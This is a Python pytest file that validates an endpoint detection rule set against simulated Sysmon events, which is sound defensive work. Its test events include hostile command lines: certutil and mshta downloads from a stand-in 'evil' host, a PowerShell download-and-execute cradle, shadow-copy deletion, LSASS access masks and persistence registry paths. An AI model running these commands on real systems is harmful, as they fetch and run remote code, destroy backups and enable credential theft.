"""Rule corpus validation.

Every shipped rule is exercised against a true positive it must catch and, where
it matters, a true negative it must ignore. This is the detection-engineering
contract in test form: a rule that never fires is worse than no rule, because it
creates false confidence in coverage, and a rule that fires on everything trains
the analyst to ignore it.

Two real bugs were caught writing these cases: a `condition: any` cradle rule
that fired on every PowerShell process regardless of command line, and a regex
whose `\b` word boundary failed against a hyphenated `-urlcache` flag.
"""

from __future__ import annotations

import pytest

from backend.config import settings
from backend.engine.matcher import evaluate
from backend.engine.rule_loader import RuleStore
from backend.models.schemas import Event

KNOWN_FIELDS = {
    "image",
    "parent_image",
    "command_line",
    "parent_command_line",
    "process_guid",
    "parent_process_guid",
    "host",
}


@pytest.fixture(scope="module")
def rules() -> dict:
    """Load the real rule corpus once for the whole module."""
    store = RuleStore()
    store.load(settings.rules_dir)
    assert not store.errors, f"rules failed to load: {store.errors}"
    return {rule.id: rule for rule in store.all}


def event(event_id: int = 1, **fields) -> Event:
    """Build an event, routing unknown keys into raw so rules can address
    Sysmon fields like TargetObject or GrantedAccess."""
    known = {k: v for k, v in fields.items() if k in KNOWN_FIELDS}
    raw = {k: v for k, v in fields.items() if k not in KNOWN_FIELDS}
    return Event(event_id=event_id, raw=raw, **known)


# (rule_id, should_fire, event). Each rule has at least one positive and, where
# a false positive is plausible, a negative that must stay quiet.
CASES = [
    # The three founding rules, validated here alongside the rest.
    (
        "SYS-001",
        True,
        event(1, parent_image=r"C:\O\WINWORD.EXE", image=r"C:\W\cmd.exe"),
    ),
    (
        "SYS-001",
        False,
        event(1, parent_image=r"C:\W\explorer.exe", image=r"C:\W\cmd.exe"),
    ),
    (
        "SYS-002",
        True,
        event(
            1, image=r"C:\W\powershell.exe", command_line="powershell -enc " + "A" * 40
        ),
    ),
    (
        "SYS-002",
        False,
        event(1, image=r"C:\W\powershell.exe", command_line="powershell -File a.ps1"),
    ),
    ("SYS-010", True, event(10, TargetImage=r"C:\W\lsass.exe", GrantedAccess="0x1410")),
    (
        "SYS-010",
        False,
        event(10, TargetImage=r"C:\W\explorer.exe", GrantedAccess="0x1410"),
    ),
    # --- Ostap chain rules, validated against the real EVTX sample ---
    (
        "SYS-034",
        True,
        event(
            1,
            image=r"C:\Windows\System32\rundll32.exe",
            command_line=r'"C:\Windows\system32\rundll32.exe" Shell32.dll,Control_RunDLL "C:\Users\IEUser\Downloads\Invoice@0582.cpl",',
        ),
    ),
    (
        "SYS-034",
        True,
        event(
            1,
            image=r"C:\Windows\System32\control.exe",
            command_line=r'"C:\Windows\System32\control.exe" "C:\Users\IEUser\Downloads\Invoice@0582.cpl",',
        ),
    ),
    (
        "SYS-034",
        False,
        event(
            1,
            image=r"C:\Windows\System32\rundll32.exe",
            command_line=r'"C:\Windows\System32\rundll32.exe" Shell32.dll,Control_RunDLL "C:\Windows\System32\main.cpl",',
        ),
    ),
    (
        "SYS-035",
        True,
        event(
            1,
            image=r"C:\Windows\System32\wscript.exe",
            command_line=r'"C:\Windows\System32\wscript.exe" /e:JScript.Encode /nologo C:\Users\IEUser\AppData\Local\Temp\info.txt',
        ),
    ),
    (
        "SYS-035",
        False,
        event(
            1,
            image=r"C:\Windows\System32\wscript.exe",
            command_line=r"wscript.exe C:\Scripts\backup.vbs",
        ),
    ),
    (
        "SYS-036",
        True,
        event(
            1,
            parent_image=r"C:\Windows\SysWOW64\rundll32.exe",
            image=r"C:\Windows\System32\wscript.exe",
            command_line="wscript.exe x",
        ),
    ),
    (
        "SYS-036",
        False,
        event(
            1,
            parent_image=r"C:\Windows\explorer.exe",
            image=r"C:\Windows\System32\wscript.exe",
            command_line="wscript.exe x",
        ),
    ),
    (
        "SYS-003",
        True,
        event(1, command_line=r"certutil -urlcache -f http://evil/x.exe x.exe"),
    ),
    ("SYS-003", True, event(1, command_line=r"mshta http://evil/a.hta")),
    ("SYS-003", False, event(1, command_line=r"certutil -hashfile C:\a.txt SHA256")),
    ("SYS-004", True, event(1, command_line=r"vssadmin delete shadows /all /quiet")),
    ("SYS-004", True, event(1, command_line=r"wmic shadowcopy delete")),
    ("SYS-004", False, event(1, command_line=r"vssadmin list shadows")),
    (
        "SYS-005",
        True,
        event(1, parent_image=r"C:\W\outlook.exe", image=r"C:\W\powershell.exe"),
    ),
    (
        "SYS-005",
        False,
        event(1, parent_image=r"C:\W\explorer.exe", image=r"C:\W\powershell.exe"),
    ),
    ("SYS-006", True, event(1, image=r"C:\Users\emma\AppData\Local\Temp\payload.exe")),
    ("SYS-006", False, event(1, image=r"C:\Program Files\app\app.exe")),
    ("SYS-007", True, event(1, image=r"C:\Users\emma\svchost.exe")),
    ("SYS-007", False, event(1, image=r"C:\Windows\System32\svchost.exe")),
    (
        "SYS-008",
        True,
        event(1, image=r"C:\W\rundll32.exe", command_line="rundll32.exe"),
    ),
    (
        "SYS-008",
        False,
        event(
            1,
            image=r"C:\W\rundll32.exe",
            command_line=r"rundll32.exe shell32.dll,Control_RunDLL",
        ),
    ),
    (
        "SYS-009",
        True,
        event(
            1,
            image=r"C:\W\powershell.exe",
            command_line=r"powershell iex (New-Object Net.WebClient).DownloadString('http://x')",
        ),
    ),
    (
        "SYS-009",
        False,
        event(1, image=r"C:\W\powershell.exe", command_line="powershell Get-ChildItem"),
    ),
    (
        "SYS-020",
        True,
        event(
            3,
            image=r"C:\W\powershell.exe",
            DestinationIp="1.2.3.4",
            DestinationPort="443",
        ),
    ),
    (
        "SYS-020",
        False,
        event(
            3, image=r"C:\W\chrome.exe", DestinationIp="1.2.3.4", DestinationPort="443"
        ),
    ),
    ("SYS-021", True, event(3, image=r"C:\W\svchost.exe", DestinationPort="4444")),
    ("SYS-021", False, event(3, image=r"C:\W\chrome.exe", DestinationPort="4444")),
    (
        "SYS-030",
        True,
        event(
            13, TargetObject=r"HKLM\Software\Microsoft\Windows\CurrentVersion\Run\evil"
        ),
    ),
    ("SYS-030", False, event(13, TargetObject=r"HKLM\Software\App\Settings\Foo")),
    (
        "SYS-031",
        True,
        event(
            13,
            TargetObject=r"HKLM\Software\Policies\Microsoft\Windows Defender\DisableAntiSpyware",
        ),
    ),
    ("SYS-031", False, event(13, TargetObject=r"HKLM\Software\App\Foo")),
    (
        "SYS-032",
        True,
        event(
            13, TargetObject=r"HKLM\...\Image File Execution Options\sethc.exe\Debugger"
        ),
    ),
    (
        "SYS-032",
        False,
        event(
            13,
            TargetObject=r"HKLM\...\Image File Execution Options\notepad.exe\GlobalFlag",
        ),
    ),
    (
        "SYS-040",
        True,
        event(
            7,
            Image=r"C:\evil\loader.exe",
            ImageLoaded=r"C:\W\System.Management.Automation.dll",
        ),
    ),
    (
        "SYS-040",
        False,
        event(
            7,
            Image=r"C:\W\powershell.exe",
            ImageLoaded=r"C:\W\System.Management.Automation.dll",
        ),
    ),
    ("SYS-041", True, event(10, TargetImage=r"C:\W\lsass.exe", GrantedAccess="0x1410")),
    (
        "SYS-041",
        False,
        event(10, TargetImage=r"C:\W\lsass.exe", GrantedAccess="0x1000"),
    ),
    (
        "SYS-050",
        True,
        event(11, TargetFilename=r"C:\...\Start Menu\Programs\Startup\evil.exe"),
    ),
    ("SYS-050", False, event(11, TargetFilename=r"C:\Users\emma\Documents\a.txt")),
    (
        "SYS-051",
        True,
        event(
            11, Image=r"C:\O\WINWORD.EXE", TargetFilename=r"C:\Users\emma\AppData\a.ps1"
        ),
    ),
    (
        "SYS-051",
        False,
        event(11, Image=r"C:\O\WINWORD.EXE", TargetFilename=r"C:\Users\emma\doc.docx"),
    ),
    ("SYS-060", True, event(17, PipeName=r"\msagent_4f")),
    ("SYS-060", True, event(17, PipeName=r"\postex_1a2b")),
    ("SYS-060", False, event(17, PipeName=r"\lsass")),
]


@pytest.mark.parametrize("rule_id, should_fire, evt", CASES)
def test_rule_fires_as_expected(rules, rule_id, should_fire, evt) -> None:
    rule = rules.get(rule_id)
    assert rule is not None, f"{rule_id} is not in the loaded corpus"
    fired = bool(evaluate(evt, [rule]))
    assert fired == should_fire


def test_every_rule_has_a_test_case(rules) -> None:
    """Guardrail: a rule added without a validation case is a coverage gap. This
    fails the moment someone ships a rule and forgets to prove it fires."""
    tested = {rule_id for rule_id, _, _ in CASES}
    untested = set(rules) - tested
    assert not untested, f"rules with no validation case: {sorted(untested)}"
